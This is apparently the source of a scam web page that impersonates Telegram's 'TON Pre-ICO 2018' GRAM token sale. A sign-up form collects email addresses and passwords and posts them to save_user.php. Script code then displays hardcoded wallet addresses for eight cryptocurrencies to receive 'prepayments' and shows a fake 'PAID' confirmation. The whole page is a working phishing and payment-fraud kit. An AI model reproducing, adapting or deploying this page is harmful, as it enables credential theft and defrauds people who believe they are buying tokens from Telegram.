

    <!DOCTYPE html>
    <!-- Add <html lang="en-CA" class=" js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports">
-->
    <html>
	    
	    
<meta https-equiv="content-type" content="text/html;charset=UTF-8" />

    <head>
        <meta https-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta https-equiv="X-UA-Compatible" content="IE=edge">
        <title> Purchase GRAM | TON Pre-ICO 2018 </title>
        <meta property="og:title" content="Telegram Network ICO">
        <meta property="og:type" content="website">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="index_files/font-awesome.min.css">
        <link rel="icon" href="images/fav.png">
        <link rel="stylesheet" href="index_files/style.min.css???????????" type="text/css" media="all">
        <script type="text/javascript" src="index_files/modernizr.custom.min.js.hxd"></script>
<script
			  src="https://code.jquery.com/jquery-3.3.1.js"
			  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
			  crossorigin="anonymous"></script>
        <script type="text/javascript" src="index_files/tether.min.js.hxd"></script>
        <link rel="stylesheet" href="index_files/font-awesome.min(1).css">
        <script async="" src="index_files/js.txt"></script>

        <link href="images/fav.png" rel="shortcut icon" type="image/x-icon">

    </head>

    <body style="background: url(index_files/stormbg-min.jpg)  no-repeat center top fixed; background-size: 100%; ">

        <div class="content-container content-alert bg-secondary body-color">
                                    <div class="container text-center">
                                        <div class="row justify-content-center">
                                            <div class="col-12 col-lg-12 col-xl-12">
  
               
         <div class="col-sm-7">

           <div class="slogan"></div>
           
    </div>
        <div class="col-sm-3">
      
      
        </div>
    </div>
   </div>
   
<div class="container">
    


       <div class="row">
        <div class="col-sm-12">
       
   

       
       
       
       
           <div class="row">
<div class="col-sm-2">&nbsp;</div>
 <div class="col-sm-8 content main_txt">
 
<form action="save_user.php" method="post" enctype="multipart/form-data" class="formez">
   <center> <a href="../index.htm"><img src="../ton.jpeg" class="" style="width:150px; margin-left:auto; margin-right:auto;"> </a> </center>
                <h5 class="text-uppercase text-center mb-10">Sign Up for the GRAM token sale</h5>
                <h6 class="text-uppercase text-center mb-10" style="padding:15px 0 5px 0;font-size: 12px; color: #999;">Already have an account? - <a href="index.php" style="color: #0275d8; text-decoration: underline;">Sign In</a></h6>
                <h5 class="text-uppercase text-center mb-10" style="padding:5px 0 15px 0; color:#3152ed; font-weight: bold;">Join now and get Bonus!</h5>


   
                    <div class="form-group col-12 ">
                        <select class="form-control" name="country">
                            <option value="0">*Select Country</option>
                                                        <option value="1">Albania</option>
                                                        <option value="2">Andorra</option>
                                                        <option value="3">Armenia</option>
                                                        <option value="4">Austria</option>
                                                        <option value="5">Azerbaijan</option>
                                                        <option value="48">Algeria</option>
                                                        <option value="49">Angola</option>
                                                        <option value="101">Afghanistan</option>
                                                        <option value="145">Antigua and Barbuda</option>
                                                        <option value="168">Australia</option>
                                                        <option value="182">Argentina</option>
                                                        <option value="6">Belarus</option>
                                                        <option value="7">Belgium</option>
                                                        <option value="8">Bosnia and Herzegovina</option>
                                                        <option value="9">Bulgaria</option>
                                                        <option value="50">Benin</option>
                                                        <option value="51">Botswana</option>
                                                        <option value="52">Burkina</option>
                                                        <option value="53">Burundi</option>
                                                        <option value="102">Bahrain</option>
                                                        <option value="103">Bangladesh</option>
                                                        <option value="104">Bhutan</option>
                                                        <option value="105">Brunei</option>
                                                        <option value="106">Burma (Myanmar)</option>
                                                        <option value="146">Bahamas</option>
                                                        <option value="147">Barbados</option>
                                                        <option value="148">Belize</option>
                                                        <option value="183">Bolivia</option>
                                                        <option value="184">Brazil</option>
                                                        <option value="10">Croatia</option>
                                                        <option value="11">Cyprus</option>
                                                        <option value="12">Czech Republic</option>
                                                        <option value="54">Cameroon</option>
                                                        <option value="55">Cape Verde</option>
                                                        <option value="56">Central African Republic</option>
                                                        <option value="57">Chad</option>
                                                        <option value="58">Comoros</option>
                                                        <option value="59">Congo</option>
                                                        <option value="60">Congo (Dem. Rep.)</option>
                                                        <option value="107">Cambodia</option>
                                                        <option value="108">China</option>
                                                        <option value="149">Canada</option>
                                                        <option value="150">Costa Rica</option>
                                                        <option value="151">Cuba</option>
                                                        <option value="185">Chile</option>
                                                        <option value="186">Colombia</option>
                                                        <option value="13">Denmark</option>
                                                        <option value="61">Djibouti</option>
                                                        <option value="152">Dominica</option>
                                                        <option value="153">Dominican Rep.</option>
                                                        <option value="14">Estonia</option>
                                                        <option value="62">Egypt</option>
                                                        <option value="63">Equatorial Guinea</option>
                                                        <option value="64">Eritrea</option>
                                                        <option value="65">Ethiopia</option>
                                                        <option value="109">East Timor</option>
                                                        <option value="154">El Salvador</option>
                                                        <option value="187">Ecuador</option>
                                                        <option value="15">Finland</option>
                                                        <option value="16">France</option>
                                                        <option value="169">Fiji</option>
                                                        <option value="17">Georgia</option>
                                                        <option value="18">Germany</option>
                                                        <option value="19">Greece</option>
                                                        <option value="66">Gabon</option>
                                                        <option value="67">Gambia</option>
                                                        <option value="68">Ghana</option>
                                                        <option value="69">Guinea</option>
                                                        <option value="70">Guinea-Bissau</option>
                                                        <option value="155">Grenada</option>
                                                        <option value="156">Guatemala</option>
                                                        <option value="188">Guyana</option>
                                                        <option value="20">Hungary</option>
                                                        <option value="157">Haiti</option>
                                                        <option value="158">Honduras</option>
                                                        <option value="21">Iceland</option>
                                                        <option value="22">Ireland</option>
                                                        <option value="23">Italy</option>
                                                        <option value="71">Ivory Coast</option>
                                                        <option value="110">India</option>
                                                        <option value="111">Indonesia</option>
                                                        <option value="112">Iran</option>
                                                        <option value="113">Iraq</option>
                                                        <option value="114">Israel</option>
                                                        <option value="115">Japan</option>
                                                        <option value="116">Jordan</option>
                                                        <option value="159">Jamaica</option>
                                                        <option value="72">Kenya</option>
                                                        <option value="117">Kazakhstan</option>
                                                        <option value="118">Korea (north)</option>
                                                        <option value="119">Korea (south)</option>
                                                        <option value="120">Kuwait</option>
                                                        <option value="121">Kyrgyzstan</option>
                                                        <option value="170">Kiribati</option>
                                                        <option value="24">Latvia</option>
                                                        <option value="25">Liechtenstein</option>
                                                        <option value="26">Lithuania</option>
                                                        <option value="27">Luxembourg</option>
                                                        <option value="73">Lesotho</option>
                                                        <option value="74">Liberia</option>
                                                        <option value="75">Libya</option>
                                                        <option value="122">Laos</option>
                                                        <option value="123">Lebanon</option>
                                                        <option value="28">Macedonia</option>
                                                        <option value="29">Malta</option>
                                                        <option value="30">Moldova</option>
                                                        <option value="31">Monaco</option>
                                                        <option value="32">Montenegro</option>
                                                        <option value="76">Madagascar</option>
                                                        <option value="77">Malawi</option>
                                                        <option value="78">Mali</option>
                                                        <option value="79">Mauritania</option>
                                                        <option value="80">Mauritius</option>
                                                        <option value="81">Morocco</option>
                                                        <option value="82">Mozambique</option>
                                                        <option value="124">Malaysia</option>
                                                        <option value="125">Maldives</option>
                                                        <option value="126">Mongolia</option>
                                                        <option value="160">Mexico</option>
                                                        <option value="171">Marshall Islands</option>
                                                        <option value="172">Micronesia</option>
                                                        <option value="33">Netherlands</option>
                                                        <option value="34">Norway</option>
                                                        <option value="83">Namibia</option>
                                                        <option value="84">Niger</option>
                                                        <option value="85">Nigeria</option>
                                                        <option value="127">Nepal</option>
                                                        <option value="161">Nicaragua</option>
                                                        <option value="173">Nauru</option>
                                                        <option value="174">New Zealand</option>
                                                        <option value="128">Oman</option>
                                                        <option value="35">Poland</option>
                                                        <option value="36">Portugal</option>
                                                        <option value="129">Pakistan</option>
                                                        <option value="130">Philippines</option>
                                                        <option value="162">Panama</option>
                                                        <option value="175">Palau</option>
                                                        <option value="176">Papua New Guinea</option>
                                                        <option value="189">Paraguay</option>
                                                        <option value="190">Peru</option>
                                                        <option value="131">Qatar</option>
                                                        <option value="37">Romania</option>
                                                        <option value="86">Rwanda</option>
                                                        <option value="132">Russian Federation</option>
                                                        <option value="38">San Marino</option>
                                                        <option value="39">Serbia</option>
                                                        <option value="40">Slovakia</option>
                                                        <option value="41">Slovenia</option>
                                                        <option value="42">Spain</option>
                                                        <option value="43">Sweden</option>
                                                        <option value="44">Switzerland</option>
                                                        <option value="87">Sao Tome and Principe</option>
                                                        <option value="88">Senegal</option>
                                                        <option value="89">Seychelles</option>
                                                        <option value="90">Sierra Leone</option>
                                                        <option value="91">Somalia</option>
                                                        <option value="92">South Africa</option>
                                                        <option value="93">Sudan</option>
                                                        <option value="94">Swaziland</option>
                                                        <option value="133">Saudi Arabia</option>
                                                        <option value="134">Singapore</option>
                                                        <option value="135">Sri Lanka</option>
                                                        <option value="136">Syria</option>
                                                        <option value="163">St. Kitts &amp; Nevis</option>
                                                        <option value="164">St. Lucia</option>
                                                        <option value="165">St. Vincent &amp; the Grenadines</option>
                                                        <option value="177">Samoa</option>
                                                        <option value="178">Solomon Islands</option>
                                                        <option value="191">Suriname</option>
                                                        <option value="95">Tanzania</option>
                                                        <option value="96">Togo</option>
                                                        <option value="97">Tunisia</option>
                                                        <option value="137">Tajikistan</option>
                                                        <option value="138">Thailand</option>
                                                        <option value="139">Turkey</option>
                                                        <option value="140">Turkmenistan</option>
                                                        <option value="166">Trinidad &amp; Tobago</option>
                                                        <option value="179">Tonga</option>
                                                        <option value="180">Tuvalu</option>
                                                        <option value="195">Taiwan</option>
                                                        <option value="45">Ukraine</option>
                                                        <option value="46">United Kingdom</option>
                                                        <option value="98">Uganda</option>
                                                        <option value="141">United Arab Emirates</option>
                                                        <option value="142">Uzbekistan</option>
                                                        <option value="167">United States </option>
                                                        <option value="192">Uruguay</option>
                                                        <option value="47">Vatican City</option>
                                                        <option value="143">Vietnam</option>
                                                        <option value="181">Vanuatu </option>
                                                        <option value="193">Venezuela</option>
                                                        <option value="144">Yemen </option>
                                                        <option value="99">Zambia</option>
                                                        <option value="100">Zimbabwe</option>
                                                    </select>

                    </div>

                    <div class="form-group col-12 ">
                        <input type="text" name="email" value="" class="form-control" placeholder="*Email address">
                    </div>

                    <div class="form-group col-md-6" style="float:left;">
                        <input type="password" name="pass" value="" class="form-control" placeholder="*Password">
                    </div>

                    <div class="form-group col-md-6" style="float:left;">
                        <input type="password" name="pass_p" value="" class="form-control" placeholder="*Password (confirm)">
                    </div>

          

                
                    <br>
                    <button class="btn btn-bold btn-block btn-primary mt-10" type="submit">Register</button>
           
     <br>
                <p class="text-center text-muted fs-13 mt-20">Already have an account? <a href="index.php">Sign in</a></p>
          
   
   
        </form>
   
   
   
   
   







       

        </div>
    </div>
   </div> 


 </div> 
  
   
   

        </body>
    
    
    
            <script type="text/javascript" src="index_files/firebase.js.hxd"></script>
        <script type="text/javascript" src="index_files/plugins.min.js.hxd"></script>
        <script type="text/javascript" src="index_files/scripts.min.js.hxd"></script>


<script>
	

	
	var s_arr = {'btc' : 0.00026919, 'ltc' : 0.02085536, 'dash' : 0.0070908, 'bch' : 0.00240644, 'zec' : 0.01034657, 'xmr' : 0.0148535, 'etc' : 0.09559941, 'eth' : 0.00361664};


	//setTimeout(function(){jQuery(".loading_form").css({'display':'none'}); jQuery(".payment_form").css({'display':'block'}); jQuery(".selected_crypto").css({'display':'block'});}, 500);	
	
	setTimeout(function(){jQuery(".loading_form").css({'display':'none'}); jQuery(".payment_selector").css({'display':'block'});}, 500);
	
	jQuery(".bt_a").on('click', function(){
		
		jQuery(".bt_a").removeClass('bt_active');
		
		var t = jQuery(this).data('type');
		
		window.t = t;
		
		var rates = jQuery(this).data('rates');

		jQuery(this).addClass('bt_active');
		
		jQuery(".btn_cont").prop('disabled', false);
		
		jQuery(".type-form").fadeIn('fast');
		
		jQuery(".lbl-rates").html("<b>1 <label class=\"gram_hig\">GRAM</label></b> = " + rates + " <b>" + t.toUpperCase()+"</b>");
		
		jQuery(".total_amount").html("0 " + " <b>" + t.toUpperCase()+"</b>");
		
		
		
		jQuery('html, body').animate({
	        scrollTop: jQuery("footer").offset().top
	    }, 10);


		
		
		function calc_e(){
			
			jQuery(".gram-amount").unbind().on('keyup', function(){
					
				calc_i();	
					
			});
		}
		
		
		
		function calc_i()
		{
					var am = jQuery(".gram-amount");
					
					var unit = 0;
					
					var c_calc = 0;
					
					if (!isNaN(am.val()) && am.val().length > 0)
					{
						unit = s_arr[t];
						c_calc = c_calc = unit * am.val();
					}
					else
					{
						unit = 0;
						c_calc = 0;
					}
					
					c_calc = Math.round(c_calc*100000000)/100000000;
							
					jQuery(".total_amount").html(c_calc + " <b>" + t.toUpperCase()+"</b>");
					
					window.c_calc = c_calc;
		}
		
		


		calc_e();
		
		calc_i();
		


	});
	

    
	jQuery('.btn_cont').on('click', function(){
		
		var t = window.t;
		
		var am = jQuery(".gram-amount");
		
		var em = jQuery(".input-mail");
		
		var e = false;
		
var amnt =  am.val();
        
jQuery("#prepp").val(am.val());
        
        
        
        
        

        
        
        
        
        
        
		
		if ((am.val() <= 0 || isNaN(am.val())) && !e)
		{
			am.addClass('field_empty');
			am.focus();
			e = true;
		}
		else
		{
			am.removeClass('field_empty');
		}
		
		if (em.val().length < 6 && !e)
		{
			em.addClass('field_empty');	
			em.focus();
			e = true;
		}
		else
		{
			em.removeClass('field_empty');
		}
		
		
		
		if (!e)
		{
			jQuery(".payment_selector").css({'display':'none'});
			
			//jQuery(".loading_form").css({'display':'block'});
            jQuery(".payment_form").css({'display':'block'}); 
			
			jQuery("#rcv_am").html(am.val());
            
            jQuery("#prepp").val(am.val());
			
			jQuery("#pay_am").html(window.c_calc);
			
			jQuery("._hig").html(t.toUpperCase());
            
            
			
			var telegram = jQuery(".input-tg");
			
			jQuery('.recip_email').html(em.val());
			
            
            
            
            
	if ( jQuery("._hig").html() == "BTC"){
  var mywalt = "1MnMTnnSjLyyPDyXWsNLfUvt6LLN9S8Vdx";
    }
if ( jQuery("._hig").html() == "LTC"){
  var mywalt = "LZqX6WxSRju8yaQ1HKvMfX2hiwBHJ126P6";
    }
if ( jQuery("._hig").html() == "DASH"){
  var mywalt = "Xbv4CiGVxyzFTnk782UyMtCNdBSTE1ooCQ";
    }
if ( jQuery("._hig").html() == "ETC"){
  var mywalt = "0x96811b1689c188c9bcca2585fc013a491cab879b";
    }
if ( jQuery("._hig").html() == "ETH"){
  var mywalt = "0xf94b8e0ceba6dcd1b888fe02141dd9d0b8e67715";
    }
if ( jQuery("._hig").html() == "ZEC"){
  var mywalt = "t1dfMCCErDtkBwihn3BoB4kHyqfGTBZ7yhF";
    }
if ( jQuery("._hig").html() == "XMR"){
  var mywalt = "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQmy9SDFtKV9A63scVP";
    }
if ( jQuery("._hig").html() == "BCH"){
  var mywalt = "qzzlrem84tj2f9k89kkc2x3895nlnqfgd5le3lnn4h";
    }

		
        jQuery('.walletAddress').html(mywalt + " <label class=\"copy_btn\" data-w=\""+mywalt+"\">copy</label>");
        jQuery('.qr_img_code').prop('src', 'https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=' + mywalt)   
            
            
            
		}
		
		
	});
	
	 
    jQuery('.btn_cont2').on('click', function(){
           
               var werwee = jQuery('#prepp').val()
                                          
               alert('PrePaid ' + werwee + ' GRAM');
    window.location.href = "index.php?prepp="+werwee;
                                                              });
                                                         
	function payment_checker(wallet, s_type, s_mail, hash, amount)
	{
		
		var x = jQuery;
		
		var k = setInterval(function(){
			
			x.post("s-core/", {'wallet':wallet, 'type':s_type, 'mail' : s_mail, 'hash' : hash, 'amount':amount}, function(json){
				
				
				if (json.state == "ok")
				{
					clearInterval(k);
					
					jQuery(".state_lbl").html("<font color=green><b>PAID</b></font><br><b>Information has been sent to your mail</b>");
				}
				
			}, 'json');
			
		}, 3000);
		
	}
	
	

	
	
</script>
	

    
    <footer class="m_footer">
		<table class="footer_table_50">
			<tr>
				<td>
					<a href="../"><img src="../landing/images/logo.png" class="footer_img"></a>
				</td>
				<td>
					<b>Telegram</b>
					<br>
					<label class="footer_text">Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.</label>
				</td>
				
				<td>
					
							<div class="col-md-12 float-right">
<ul class="footer-links">
<li><a href="../#what-is-gram">What is Gram?</a></li>
<li><a href="../#features">Features</a></li>
<li><a href="../#our-team">Our Team</a></li>
<li><a href="../#roadmap">Roadmap</a></li>
<li><a href="../whitepaper/gram_whitepaper.pdf" target="_blank">White Paper</a></li>
</ul>
</div>

				</td>
				
			</tr>
		</table>
		

		
		

    </footer>
    
   <link rel="stylesheet" href="../cust.css" type="text/css" media="all">
    
    
    </html>	    


